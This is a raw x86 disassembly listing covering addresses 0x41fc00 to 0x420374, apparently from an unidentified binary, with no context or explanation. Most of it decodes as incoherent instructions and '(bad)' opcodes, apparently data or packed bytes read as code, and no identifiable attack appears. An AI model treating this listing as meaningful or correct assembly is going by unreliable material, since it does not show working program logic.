  41fc00:	and    BYTE PTR [ebp-0x6626a3ff],cl
  41fc06:	es xchg ecx,eax
  41fc08:	and    al,0x90
  41fc0a:	cmp    ah,BYTE PTR [esi+0x5cef27a]
  41fc10:	add    dl,0xcb
  41fc13:	jnp    0x41fc36
  41fc15:	pop    ecx
  41fc16:	in     eax,0xca
  41fc18:	fadd   QWORD PTR [eax-0x14]
  41fc1b:	pop    eax
  41fc1c:	sbb    DWORD PTR [eax],ecx
  41fc1e:	mov    DWORD PTR [edx-0x14],ecx
  41fc21:	in     al,0x1d
  41fc23:	pop    esp
  41fc24:	frstor [edx-0x301537a5]
  41fc2a:	sbb    bl,cl
  41fc2c:	push   eax
  41fc2d:	xchg   edi,eax
  41fc2e:	loop   0x41fca8
  41fc30:	out    dx,eax
  41fc31:	mov    ?,WORD PTR [edx+0x4f]
  41fc34:	repnz or al,0x70
  41fc37:	outs   dx,BYTE PTR ds:[esi]
  41fc38:	push   ebx
  41fc39:	cmp    esi,eax
  41fc3b:	sub    eax,0x3d8c1372
  41fc40:	add    eax,0x146b26d6
  41fc45:	xchg   edi,eax
  41fc46:	or     eax,0x9cf95d5e
  41fc4b:	cld    
  41fc4c:	repz sbb ecx,DWORD PTR [ecx+ecx*1]
  41fc50:	retf   
  41fc51:	sub    dh,BYTE PTR [eax+eax*2+0x6777813b]
  41fc58:	fst    QWORD PTR [ebx+0x16]
  41fc5b:	fdivr  QWORD PTR [ebx-0x2c571bd0]
  41fc61:	sahf   
  41fc62:	and    BYTE PTR [ebx+0x63],bl
  41fc65:	adc    al,0x87
  41fc67:	stc    
  41fc68:	mov    eax,0xd6b1e8e6
  41fc6d:	out    dx,al
  41fc6e:	mov    BYTE PTR [edx+0x6946cabe],cl
  41fc74:	jle    0x41fc66
  41fc76:	push   es
  41fc77:	and    BYTE PTR [eax+0x78],ah
  41fc7a:	inc    ecx
  41fc7b:	cmp    dl,cl
  41fc7d:	mov    al,ds:0xcffd6eba
  41fc82:	and    eax,0x3bd5615f
  41fc87:	lea    esp,[ebx-0x4ebbe658]
  41fc8d:	and    eax,0x940570f5
  41fc92:	xlat   BYTE PTR ds:[ebx]
  41fc93:	ins    BYTE PTR es:[edi],dx
  41fc94:	push   edi
  41fc95:	das    
  41fc96:	out    0xbb,eax
  41fc98:	xchg   ecx,eax
  41fc99:	sbb    eax,0x637de0f3
  41fc9e:	lds    edx,FWORD PTR [edi]
  41fca0:	dec    ecx
  41fca1:	call   0x5d58e982
  41fca6:	mov    ds:0xf4807b34,eax
  41fcab:	add    esi,ebp
  41fcad:	(bad)  
  41fcae:	fwait
  41fcaf:	sub    BYTE PTR [ebp+eiz*4+0x3b],0xb9
  41fcb4:	sahf   
  41fcb5:	jecxz  0x41fc8e
  41fcb7:	sbb    al,0xbf
  41fcb9:	sbb    ch,dl
  41fcbb:	jo     0x41fcfa
  41fcbd:	aas    
  41fcbe:	sub    ebx,DWORD PTR [esi+0x5b]
  41fcc1:	repnz mov ds:0x7ec83286,al
  41fcc7:	test   DWORD PTR [edi-0x5f224bb],ebx
  41fccd:	mov    WORD PTR [ecx+ebx*2+0x47],es
  41fcd1:	cwde   
  41fcd2:	pusha  
  41fcd3:	std    
  41fcd4:	scas   al,BYTE PTR es:[edi]
  41fcd5:	sub    cl,BYTE PTR [ecx-0x7cd74032]
  41fcdb:	inc    ebx
  41fcdc:	mov    ebx,0xe958c116
  41fce1:	jb     0x41fc83
  41fce3:	clc    
  41fce4:	xchg   ecx,eax
  41fce5:	popa   
  41fce6:	jl     0x41fd37
  41fce8:	xor    DWORD PTR [ebp+0x25e4aa87],ecx
  41fcee:	xchg   BYTE PTR [ebx+0xf83ea36],ah
  41fcf4:	sub    DWORD PTR ds:0xf65f9f2,esi
  41fcfa:	and    bh,cl
  41fcfc:	mov    al,ds:0xd15f6236
  41fd01:	pop    es
  41fd02:	pop    edx
  41fd03:	sub    ah,cl
  41fd05:	ds out dx,al
  41fd07:	cmp    cl,bl
  41fd09:	jno    0x41fd1f
  41fd0b:	mov    DWORD PTR [edx+0x0],edi
  41fd0e:	or     eax,0xe9923d8c
  41fd13:	push   edx
  41fd14:	aad    0x98
  41fd16:	cdq    
  41fd17:	call   0x8bbc95d0
  41fd1c:	push   edi
  41fd1d:	push   cs
  41fd1e:	shl    DWORD PTR ds:0xe8ad2879,cl
  41fd24:	lea    ebp,[ecx+0x5339988b]
  41fd2a:	adc    esp,DWORD PTR [esi-0x335f9ba6]
  41fd30:	mov    ch,0x93
  41fd32:	loop   0x41fd96
  41fd34:	sbb    DWORD PTR [ebp+0x72],esi
  41fd37:	pop    ds
  41fd38:	sub    dl,BYTE PTR [ebx+0x37]
  41fd3b:	mov    al,0x3a
  41fd3d:	mov    edx,0x69701353
  41fd42:	push   ds
  41fd43:	into   
  41fd44:	xchg   ebp,eax
  41fd45:	dec    esi
  41fd46:	xor    BYTE PTR [eax+0x3f5e8600],0x39
  41fd4d:	rol    DWORD PTR [edx],0xa8
  41fd50:	cmp    DWORD PTR [ebp-0x4a],esp
  41fd53:	cli    
  41fd54:	(bad)  
  41fd55:	outs   dx,BYTE PTR ds:[esi]
  41fd56:	add    BYTE PTR [ebx+0x68e01495],dl
  41fd5c:	jbe    0x41fd63
  41fd5e:	jle    0x41fd34
  41fd60:	leave  
  41fd61:	jg     0x41fcf9
  41fd63:	jb     0x41fd36
  41fd65:	data16 adc al,0xac
  41fd68:	add    BYTE PTR [ecx+0x1d],0x1c
  41fd6c:	pop    ebp
  41fd6d:	sar    BYTE PTR [ebp+0x5a9f40d4],1
  41fd73:	fnstenv [eax-0x52995a62]
  41fd79:	inc    ebx
  41fd7a:	add    esi,DWORD PTR [ebx+eax*8+0x1]
  41fd7e:	inc    esp
  41fd7f:	mov    esp,0x4cc8f373
  41fd84:	xchg   esp,eax
  41fd85:	je     0x41fd3f
  41fd87:	test   al,0x4c
  41fd89:	fistp  QWORD PTR [ebx-0x6f273d52]
  41fd8f:	xor    edi,DWORD PTR [edi+ebx*1+0x6250277e]
  41fd96:	jnp    0x41fe0e
  41fd98:	or     ch,BYTE PTR [ecx-0x7a3be93c]
  41fd9e:	inc    ecx
  41fd9f:	dec    bp
  41fda1:	dec    esp
  41fda2:	test   eax,0x9d8abfd9
  41fda7:	shl    ah,0xb2
  41fdaa:	xor    eax,0x8684679b
  41fdaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdb0:	sbb    ch,BYTE PTR [ebx+0x65]
  41fdb3:	add    DWORD PTR [ebp+0x217a1a8f],eax
  41fdb9:	inc    esp
  41fdba:	xchg   DWORD PTR [ecx+0x6b],esp
  41fdbd:	push   ebp
  41fdbe:	out    0x1a,al
  41fdc0:	jns    0x41fd65
  41fdc2:	and    esp,edi
  41fdc4:	dec    esi
  41fdc5:	(bad)  
  41fdc6:	fcmovb st,st(4)
  41fdc8:	shr    DWORD PTR [edi-0x42a939a5],1
  41fdce:	fnstcw WORD PTR [ecx-0x183b5c2e]
  41fdd4:	cmp    BYTE PTR [edx],ch
  41fdd6:	daa    
  41fdd7:	mov    ds:0xa300308f,eax
  41fddc:	cdq    
  41fddd:	lods   al,BYTE PTR ds:[esi]
  41fdde:	mov    edx,0x20aa5994
  41fde3:	xlat   BYTE PTR ds:[ebx]
  41fde4:	push   eax
  41fde5:	inc    esp
  41fde6:	popf   
  41fde7:	cli    
  41fde8:	pop    edx
  41fde9:	into   
  41fdea:	mov    bl,0xd8
  41fdec:	imul   ecx,DWORD PTR [eax-0x5e],0x3a1bdd1f
  41fdf3:	mov    ch,0xda
  41fdf5:	outs   dx,DWORD PTR ds:[esi]
  41fdf6:	sub    eax,0x8d03f3d2
  41fdfb:	fild   QWORD PTR [eax+ebx*4-0xdcbd9c]
  41fe02:	mov    al,0x3e
  41fe04:	jg     0x41fe81
  41fe06:	ins    DWORD PTR es:[edi],dx
  41fe07:	out    0x62,al
  41fe09:	pop    ss
  41fe0a:	add    DWORD PTR [edx-0x1c26c644],eax
  41fe10:	xchg   al,al
  41fe12:	adc    cl,BYTE PTR [ecx-0x6a]
  41fe15:	loop   0x41fde3
  41fe17:	mov    dh,0xa4
  41fe19:	xchg   esp,eax
  41fe1a:	popf   
  41fe1b:	xchg   ecx,eax
  41fe1c:	sahf   
  41fe1d:	out    dx,eax
  41fe1e:	or     BYTE PTR [ebx-0x34],cl
  41fe21:	cmc    
  41fe22:	dec    ebp
  41fe23:	in     al,0x90
  41fe25:	xor    DWORD PTR [edi+edx*8-0x27ce05b9],esi
  41fe2c:	add    DWORD PTR [ebx-0xe6edf23],esi
  41fe32:	mov    al,ds:0x1d64906f
  41fe37:	ins    DWORD PTR es:[edi],dx
  41fe38:	pop    es
  41fe39:	sbb    al,0x75
  41fe3b:	repz fcom DWORD PTR [edx-0x32]
  41fe3f:	not    edx
  41fe41:	iret   
  41fe42:	fwait
  41fe43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe44:	seto   BYTE PTR [edx+0x54]
  41fe48:	lahf   
  41fe49:	xchg   DWORD PTR [ecx],ebx
  41fe4b:	dec    ebp
  41fe4c:	xchg   edi,eax
  41fe4d:	mov    ecx,0x4b348428
  41fe52:	push   edx
  41fe53:	shl    BYTE PTR [edi+0x1c],cl
  41fe56:	push   ds
  41fe57:	sbb    dh,BYTE PTR [esi+edi*2]
  41fe5a:	cmp    cl,BYTE PTR [ebp-0x45]
  41fe5d:	cs jle 0x41fed3
  41fe60:	xchg   edi,eax
  41fe61:	jl     0x41fe99
  41fe63:	add    edx,DWORD PTR [ecx]
  41fe65:	das    
  41fe66:	in     al,dx
  41fe67:	addr16 es cmp eax,0xd34ec069
  41fe6e:	push   edi
  41fe6f:	cwde   
  41fe70:	adc    DWORD PTR [eax+0x3d6c739d],esp
  41fe76:	scas   eax,DWORD PTR es:[edi]
  41fe77:	inc    BYTE PTR [edx+ebp*4]
  41fe7a:	dec    ebp
  41fe7b:	jp     0x41fe48
  41fe7d:	push   esp
  41fe7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe7f:	xor    bh,BYTE PTR [edi-0x40]
  41fe82:	rol    DWORD PTR [eax+edi*2-0x73],1
  41fe86:	jle    0x41feaf
  41fe88:	sbb    al,0x25
  41fe8a:	and    eax,0x18f71080
  41fe8f:	rol    DWORD PTR [ecx+0x26],1
  41fe92:	retf   0x5b62
  41fe95:	retf   
  41fe96:	adc    eax,DWORD PTR [ecx+edx*2-0x5c]
  41fe9a:	loop   0x41fecd
  41fe9c:	xor    al,BYTE PTR [edx+ecx*2-0x7a]
  41fea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fea1:	pop    esp
  41fea2:	or     DWORD PTR [ecx+0x4b],edi
  41fea5:	repz dec edx
  41fea7:	xor    DWORD PTR [edx+0xdf6e3c7],edx
  41fead:	xchg   edx,eax
  41feae:	cli    
  41feaf:	jle    0x41feb8
  41feb1:	xor    BYTE PTR [ecx],0xe9
  41feb4:	shl    BYTE PTR [edx-0x2a6d7677],0x8f
  41febb:	pusha  
  41febc:	xchg   ebp,eax
  41febd:	mov    ecx,0x3a4da32c
  41fec2:	shr    DWORD PTR [edi+0xfecffb8],0x1b
  41fec9:	out    0x20,al
  41fecb:	outs   dx,BYTE PTR ds:[esi]
  41fecc:	inc    edi
  41fecd:	lods   al,BYTE PTR ds:[esi]
  41fece:	fstp   DWORD PTR [esi+ebp*1+0x57]
  41fed2:	sub    cl,BYTE PTR ds:[ecx+esi*8+0x3b]
  41fed7:	mov    dh,0x9b
  41fed9:	rcr    DWORD PTR [eax+0x596715e0],cl
  41fedf:	in     eax,dx
  41fee0:	add    esi,DWORD PTR [edi+0x15]
  41fee3:	aas    
  41fee4:	clc    
  41fee5:	jmp    0x41fe82
  41fee7:	rcr    dl,1
  41fee9:	or     ebp,edi
  41feeb:	jne    0x41fe7a
  41feed:	dec    eax
  41feee:	and    eax,0xdcc3ba8c
  41fef3:	pusha  
  41fef4:	xchg   dh,dl
  41fef6:	xchg   ebp,eax
  41fef7:	cli    
  41fef8:	pop    es
  41fef9:	into   
  41fefa:	inc    ebp
  41fefb:	jne    0x41fee9
  41fefd:	call   0xe3d026d6
  41ff02:	retf   0xe2c2
  41ff05:	js     0x41ff5c
  41ff07:	aaa    
  41ff08:	push   ds
  41ff09:	pushf  
  41ff0a:	icebp  
  41ff0b:	adc    DWORD PTR [ebx-0x667f729e],eax
  41ff11:	push   es
  41ff12:	(bad)  
  41ff13:	cmp    eax,eax
  41ff15:	or     DWORD PTR [ecx*8+0x73473791],esp
  41ff1c:	repnz int3 
  41ff1e:	imul   eax,DWORD PTR [esi+0x6187cf5f],0x516b2a9e
  41ff28:	repnz and BYTE PTR [edx-0x79cf3353],bh
  41ff2f:	les    esi,FWORD PTR [esi+0x4cfd983]
  41ff35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff36:	jmp    0x41fefe
  41ff38:	xor    edx,edx
  41ff3a:	push   0x3
  41ff3c:	pop    ecx
  41ff3d:	div    ecx
  41ff3f:	mov    ecx,DWORD PTR [ebp-0x40]
  41ff42:	or     eax,ecx
  41ff44:	mov    ecx,DWORD PTR [ebp-0x54]
  41ff47:	xor    edx,edx
  41ff49:	div    ecx
  41ff4b:	imul   eax,eax,0x7d53
  41ff51:	jmp    0x420338
  41ff56:	xor    DWORD PTR [ebx],edx
  41ff58:	(bad)  
  41ff59:	in     al,dx
  41ff5a:	scas   eax,DWORD PTR es:[edi]
  41ff5b:	imul   edi,DWORD PTR [ebx-0x57113e5],0xffffffa4
  41ff62:	in     al,0x7b
  41ff64:	cld    
  41ff65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff66:	arpl   WORD PTR [ebp-0x3bb54140],dx
  41ff6c:	mov    esi,0xb38480be
  41ff71:	xchg   ebx,eax
  41ff72:	les    esp,FWORD PTR [esp+edi*8-0x1]
  41ff76:	sbb    al,0x1
  41ff78:	and    eax,0x57351e5d
  41ff7d:	sbb    esp,DWORD PTR [edx+0x2698d251]
  41ff83:	or     al,0x9d
  41ff85:	and    ah,ah
  41ff87:	cmp    eax,0x86e64cc4
  41ff8c:	pusha  
  41ff8d:	dec    edx
  41ff8e:	mov    ecx,esi
  41ff90:	(bad)  
  41ff91:	push   0x9b8ef494
  41ff96:	cmp    al,0xde
  41ff98:	inc    ebx
  41ff99:	hlt    
  41ff9a:	inc    eax
  41ff9b:	mov    ds:0x34b4c302,eax
  41ffa0:	mov    bh,0x8f
  41ffa2:	sbb    edi,eax
  41ffa4:	or     BYTE PTR [eax+0x1],dh
  41ffa7:	pop    ss
  41ffa8:	fs pop ds
  41ffaa:	addr16 adc al,0xb1
  41ffad:	ja     0x41ff50
  41ffaf:	pop    esi
  41ffb0:	sbb    edi,esi
  41ffb2:	cld    
  41ffb3:	pop    es
  41ffb4:	jns    0x41ffd7
  41ffb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffb7:	(bad)  
  41ffb8:	jbe    0x41ff68
  41ffba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffbb:	xchg   esp,eax
  41ffbc:	cdq    
  41ffbd:	test   eax,ecx
  41ffbf:	(bad)  
  41ffc1:	pop    ss
  41ffc2:	xor    BYTE PTR [ebp+0x19],bh
  41ffc5:	adc    ebp,edi
  41ffc7:	inc    ebp
  41ffc8:	cmp    eax,0x8405a435
  41ffcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffce:	jb     0x420019
  41ffd0:	cwde   
  41ffd1:	into   
  41ffd2:	jno    0x420025
  41ffd4:	xchg   ecx,eax
  41ffd5:	jnp    0x41ff62
  41ffd7:	popa   
  41ffd8:	(bad)  
  41ffd9:	lock (bad) 
  41ffdb:	and    DWORD PTR [edi+0x1],edi
  41ffde:	mov    ch,0xd7
  41ffe0:	retf   0xb9ab
  41ffe3:	stc    
  41ffe4:	out    dx,al
  41ffe5:	mov    eax,ds:0xd5d209e3
  41ffea:	pop    es
  41ffeb:	pop    edi
  41ffec:	mov    bh,0xf9
  41ffee:	dec    esi
  41ffef:	shr    BYTE PTR [ecx-0x1cf931fd],cl
  41fff5:	mov    ebx,DWORD PTR [ecx-0x48]
  41fff8:	int    0xc3
  41fffa:	bound  esp,QWORD PTR ds:0xaba25ecf
  420000:	xchg   esi,ebp
  420002:	mov    ecx,DWORD PTR [edi-0x5b]
  420005:	adc    al,0xf5
  420007:	fadd   QWORD PTR fs:[edi-0x51fe48af]
  42000e:	stc    
  42000f:	jns    0x420011
  420011:	jnp    0x41ffa4
  420013:	pop    ecx
  420014:	aaa    
  420015:	xlat   BYTE PTR ds:[ebx]
  420016:	aam    0x40
  420018:	daa    
  420019:	inc    eax
  42001a:	scas   al,BYTE PTR es:[edi]
  42001b:	mov    ds:0x88ae4b6e,eax
  420020:	jmp    0xd3ef9db5
  420025:	xchg   ebp,eax
  420026:	scas   eax,DWORD PTR es:[edi]
  420027:	sub    al,0x86
  420029:	pop    es
  42002a:	lock xchg ebp,eax
  42002c:	dec    ecx
  42002d:	scas   al,BYTE PTR es:[edi]
  42002e:	mov    ah,BYTE PTR [esi]
  420030:	imul   esp,DWORD PTR [edx-0x4a],0x20
  420034:	fsubr  DWORD PTR [ecx+0xd4bfb2f]
  42003a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42003b:	dec    esi
  42003c:	pushf  
  42003d:	jno    0x42008b
  42003f:	fiadd  WORD PTR [esp+ebx*1]
  420042:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420043:	popa   
  420044:	cs adc al,0xe6
  420047:	pop    esp
  420048:	pop    ecx
  420049:	leave  
  42004a:	push   cs
  42004b:	adc    dh,cl
  42004d:	or     eax,0xffffffc1
  420050:	and    al,0x2a
  420052:	jo     0x41fff6
  420054:	mov    dh,0x65
  420056:	iret   
  420057:	jb     0x42002a
  420059:	pop    edx
  42005a:	mov    edi,0x6a407d01
  42005f:	sub    eax,0x3c659234
  420064:	sub    edx,edi
  420066:	in     al,dx
  420067:	repz or al,BYTE PTR [edi]
  42006a:	push   es
  42006b:	and    ah,bl
  42006d:	fdiv   QWORD PTR ds:0x8540e258
  420073:	xchg   BYTE PTR [edx+0x2d],bl
  420076:	mov    ebx,0xaab79229
  42007b:	shl    DWORD PTR [edx+ecx*2+0x77dbca7e],1
  420082:	cmp    BYTE PTR [ebx-0x5c],cl
  420085:	call   0x29d53502
  42008a:	dec    edi
  42008b:	adc    esp,edx
  42008d:	ins    BYTE PTR es:[edi],dx
  42008e:	mov    WORD PTR [esi],ss
  420090:	fucom  st(6)
  420092:	xor    DWORD PTR [ebx-0x408802ff],eax
  420098:	out    dx,al
  420099:	in     al,dx
  42009a:	ins    DWORD PTR es:[edi],dx
  42009b:	cmp    ch,dh
  42009d:	sbb    DWORD PTR [edi+0x79],0xbb533b5c
  4200a4:	lds    ebx,FWORD PTR [ebx+ebp*1]
  4200a7:	mov    eax,ds:0x40a1529
  4200ac:	(bad)  
  4200ae:	jp     0xbd33fac2
  4200b4:	inc    esp
  4200b5:	mov    ebp,0x52a28bc1
  4200ba:	xchg   esi,eax
  4200bb:	pop    esp
  4200bc:	arpl   WORD PTR ss:[ebx-0x1],bx
  4200c0:	and    bh,bh
  4200c2:	(bad)  
  4200c3:	sub    ebx,DWORD PTR [edi+0x1e]
  4200c6:	in     al,dx
  4200c7:	ror    DWORD PTR [ebp-0x1b1791a1],0x58
  4200ce:	mov    bl,0xd4
  4200d0:	cmc    
  4200d1:	sbb    edx,DWORD PTR [edx-0x57c2c50f]
  4200d7:	adc    bh,ch
  4200d9:	jns    0x420149
  4200db:	mov    dh,0x79
  4200dd:	add    BYTE PTR ds:0xbd8ba6b7,al
  4200e3:	xor    BYTE PTR [edi],cl
  4200e5:	dec    ebx
  4200e6:	push   0xffffff9a
  4200e8:	pushf  
  4200e9:	pop    eax
  4200ea:	pop    ecx
  4200eb:	stos   BYTE PTR es:[edi],al
  4200ec:	adc    eax,eax
  4200ee:	lea    ebp,[di]
  4200f1:	aaa    
  4200f2:	shr    BYTE PTR [ebp-0x76],1
  4200f5:	out    0xf4,eax
  4200f7:	adc    DWORD PTR [ebx],eax
  4200f9:	xlat   BYTE PTR ds:[ebx]
  4200fa:	lea    ebx,[edx+0x3b]
  4200fd:	add    cl,BYTE PTR [edx+0x2e]
  420100:	stos   DWORD PTR es:[edi],eax
  420101:	and    al,0xe9
  420103:	cmp    eax,0x44a3b193
  420108:	xchg   esp,eax
  420109:	lds    ebx,FWORD PTR [eax-0x105aec5a]
  42010f:	das    
  420110:	xchg   esp,eax
  420111:	jno    0x4200e2
  420113:	inc    esp
  420114:	retf   0x1345
  420117:	mov    edi,0x88b3c0f
  42011c:	sbb    ebp,DWORD PTR [edx+0x32]
  42011f:	ins    BYTE PTR es:[edi],dx
  420120:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420121:	or     eax,0x34271b47
  420126:	ins    BYTE PTR es:[edi],dx
  420127:	test   al,0x6
  420129:	jnp    0x42011b
  42012b:	js     0x42013d
  42012d:	hlt    
  42012e:	add    BYTE PTR [edi+eax*2+0x1ec765ce],0xae
  420136:	scas   al,BYTE PTR es:[edi]
  420137:	push   0x468ca168
  42013c:	jnp    0x42010e
  42013e:	lods   al,BYTE PTR ds:[esi]
  42013f:	push   ebp
  420140:	test   DWORD PTR [edi-0x5acb3ed2],0x7e7a925f
  42014a:	pop    ecx
  42014b:	jmp    0x98ff:0x9b41c337
  420152:	nop
  420153:	arpl   sp,di
  420155:	arpl   si,dx
  420157:	jmp    0x7767e0b
  42015c:	test   eax,0x9cbba0e9
  420161:	pop    eax
  420162:	pop    eax
  420163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420164:	out    0x40,eax
  420166:	push   edx
  420167:	cmp    DWORD PTR [esi],edi
  420169:	je     0x4201d7
  42016b:	inc    esp
  42016c:	jecxz  0x420140
  42016e:	das    
  42016f:	call   0x333d0b8d
  420174:	jp     0x4201a2
  420176:	shr    DWORD PTR [eax],1
  420178:	mov    esi,0xf8f8758f
  42017d:	in     al,dx
  42017e:	loopne 0x420129
  420180:	pusha  
  420181:	mov    dl,0x6e
  420183:	in     al,0x5f
  420185:	loop   0x4201bd
  420187:	jno    0x42010f
  420189:	xor    al,0xb6
  42018b:	mov    bl,BYTE PTR [ebx+0x40]
  42018e:	push   ebx
  42018f:	(bad)  
  420190:	fisubr DWORD PTR [esi]
  420192:	inc    esi
  420193:	jo     0x4201ee
  420195:	or     ebx,ebp
  420197:	jge    0x420138
  420199:	addr16 mov ch,0x88
  42019c:	cwde   
  42019d:	pop    esi
  42019e:	fbld   TBYTE PTR [esi+0x272ddea7]
  4201a4:	push   0x3e
  4201a6:	push   cs
  4201a7:	daa    
  4201a8:	int    0x7c
  4201aa:	push   cs
  4201ab:	test   BYTE PTR [edi+0x23],ah
  4201ae:	shr    BYTE PTR [edx],cl
  4201b0:	pop    edx
  4201b1:	pop    ss
  4201b2:	stc    
  4201b3:	and    DWORD PTR [eax+0xd],esi
  4201b6:	push   cs
  4201b7:	idiv   DWORD PTR [ebx-0x3c6d6118]
  4201bd:	adc    eax,0x4780ce25
  4201c2:	dec    ebp
  4201c3:	ja     0x4201cd
  4201c5:	aas    
  4201c6:	cmp    DWORD PTR [ecx],edx
  4201c8:	sti    
  4201c9:	test   ch,bh
  4201cb:	push   0x65
  4201cd:	scas   al,BYTE PTR es:[edi]
  4201ce:	mov    ebx,0xb522e1c8
  4201d3:	in     eax,0xe0
  4201d5:	rcr    DWORD PTR [edx+0x31],0x49
  4201d9:	aaa    
  4201da:	test   DWORD PTR [esi-0x13],ebp
  4201dd:	and    eax,edx
  4201df:	call   0x1829:0x8d6db33f
  4201e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201e7:	push   0xd5fd8a9b
  4201ec:	mov    esp,0xa242afc7
  4201f1:	cdq    
  4201f2:	or     ebp,DWORD PTR [ebp-0x618e9039]
  4201f8:	mov    dh,0x11
  4201fa:	aad    0xdb
  4201fc:	pop    ebx
  4201fd:	ret    0x5b40
  420200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420201:	and    BYTE PTR [eax+edx*8+0x54],0xe1
  420206:	jno    0x420190
  420208:	push   ss
  420209:	mov    bh,0x93
  42020b:	stos   DWORD PTR es:[edi],eax
  42020c:	sbb    al,0x4f
  42020e:	mov    edi,0x176157a3
  420213:	jmp    0x420260
  420215:	rol    dl,0x34
  420218:	jecxz  0x42026f
  42021a:	fiadd  DWORD PTR [esi]
  42021c:	test   al,0x9e
  42021e:	mov    ebx,0x2245366
  420223:	jmp    0x420211
  420225:	adc    al,dl
  420227:	fistp  DWORD PTR ds:0x996d98df
  42022d:	ret    
  42022e:	inc    esp
  42022f:	in     eax,dx
  420230:	ret    0x3ebe
  420233:	aas    
  420234:	jae    0x4201b8
  420236:	dec    esi
  420237:	int3   
  420238:	out    0x3d,eax
  42023a:	or     eax,0xb1f29088
  42023f:	pop    es
  420240:	js     0x4201ca
  420242:	dec    esi
  420243:	cmp    DWORD PTR [eax+0x14],esi
  420246:	shr    DWORD PTR [edx+0x1d7f5831],1
  42024c:	jae    0x420205
  42024e:	dec    ebx
  42024f:	mov    bh,0xb0
  420251:	sti    
  420252:	jnp    0x42029f
  420254:	das    
  420255:	ror    DWORD PTR [esi+0x58],cl
  420258:	cmp    DWORD PTR [eax],ebp
  42025a:	cli    
  42025b:	loope  0x4201ea
  42025d:	loop   0x420228
  42025f:	shr    dl,cl
  420261:	ins    BYTE PTR es:[edi],dx
  420262:	jmp    0x42d6:0x48919884
  420269:	cmp    DWORD PTR [edx-0x1a32b442],ebx
  42026f:	push   ecx
  420270:	stc    
  420271:	mov    ax,ds:0x418bff83
  420277:	adc    bl,0xc2
  42027a:	cmc    
  42027b:	pop    ebp
  42027c:	mov    edx,0x9201d2d1
  420281:	or     eax,0x12b6e0c4
  420286:	xchg   ebx,eax
  420287:	leave  
  420288:	mov    dl,0xb6
  42028a:	(bad)  
  42028c:	push   0xffffff91
  42028e:	xor    al,0x57
  420290:	je     0x42021c
  420292:	aad    0xc5
  420294:	xchg   BYTE PTR [esi+0x2f86d66e],dh
  42029a:	adc    eax,DWORD PTR [esi-0x5e3773e2]
  4202a0:	or     esp,ecx
  4202a2:	add    cl,BYTE PTR ds:0x98d7ff6f
  4202a8:	(bad)  
  4202a9:	ss jg  0x420314
  4202ac:	xlat   BYTE PTR ds:[ebx]
  4202ad:	loopne 0x4202d9
  4202af:	sub    dl,BYTE PTR [esi-0x30dec72b]
  4202b5:	jne    0x42029f
  4202b7:	xchg   ebp,eax
  4202b8:	add    DWORD PTR [ebp-0x64],esi
  4202bb:	sar    DWORD PTR [edx+0x45],1
  4202be:	test   al,0x18
  4202c0:	dec    ebx
  4202c1:	hlt    
  4202c2:	lods   al,BYTE PTR ds:[esi]
  4202c3:	sahf   
  4202c4:	test   DWORD PTR [edi+0x44],esi
  4202c7:	inc    edx
  4202c8:	mov    dh,dl
  4202ca:	xchg   ecx,ecx
  4202cc:	fs push ebx
  4202ce:	shl    BYTE PTR [esi+ebx*8],cl
  4202d1:	xor    edi,ebx
  4202d3:	scas   al,BYTE PTR es:[edi]
  4202d4:	stos   BYTE PTR es:[edi],al
  4202d5:	hlt    
  4202d6:	pop    ebx
  4202d7:	pop    ebp
  4202d8:	inc    esp
  4202d9:	imul   ecx,edx,0x5
  4202dc:	push   0xb6880db5
  4202e1:	adc    esp,DWORD PTR [ebx+0x6d]
  4202e4:	inc    ebp
  4202e5:	mov    cl,0x1c
  4202e7:	xchg   edx,eax
  4202e8:	fcmovbe st,st(1)
  4202ea:	int    0xb4
  4202ec:	adc    al,0x9f
  4202ee:	sbb    eax,0xd010ae76
  4202f3:	in     eax,0xd4
  4202f5:	xchg   esp,eax
  4202f6:	jl     0x4202ca
  4202f8:	(bad)  
  4202f9:	push   ss
  4202fa:	adc    esp,DWORD PTR [ecx+0x2d]
  4202fd:	push   eax
  4202fe:	pop    ecx
  4202ff:	call   0x7423:0x748f9651
  420306:	or     al,0xf7
  420308:	retf   0x43e8
  42030b:	pop    ds
  42030c:	enter  0x1bda,0x29
  420310:	outs   dx,DWORD PTR ds:[esi]
  420311:	pop    ss
  420312:	push   ds
  420313:	in     al,dx
  420314:	push   cs
  420315:	dec    ecx
  420316:	shl    ebp,1
  420318:	jno    0x42029d
  42031a:	ins    DWORD PTR es:[edi],dx
  42031b:	popf   
  42031c:	push   ebp
  42031d:	xor    bl,0xb
  420320:	call   0xfe058969
  420325:	add    BYTE PTR [ecx],cl
  420327:	stc    
  420328:	sti    
  420329:	int    0x6f
  42032b:	push   edi
  42032c:	leave  
  42032d:	mov    esi,0xcf10a228
  420332:	mov    ch,0x1b
  420334:	(bad)  
  420335:	hlt    
  420336:	shl    DWORD PTR [ebp-0x75],cl
  420339:	dec    ebp
  42033a:	or     BYTE PTR [ebp-0x4806fe7c],cl
  420340:	lods   al,BYTE PTR ds:[esi]
  420341:	loopne 0x4202ce
  420343:	lea    edx,[eax]
  420345:	(bad)  
  420346:	(bad)  
  420347:	inc    DWORD PTR [ecx+0x4108e1]
  42034d:	add    BYTE PTR [ecx+0x40e7e1],al
  420353:	add    BYTE PTR [ecx+0x1a54e9],al
  420359:	add    BYTE PTR [ecx+0x25acf1],al
  42035f:	add    BYTE PTR [ebx-0x1036b],cl
  420365:	(bad)  
  420366:	jmp    0x42074d
  42036b:	pop    eax
  42036c:	dec    ecx
  42036d:	xchg   esi,eax
  42036e:	jmp    0x42030c
  420370:	cmp    al,0xbc
  420372:	jns    0x4203a4
  420374:	inc    edx
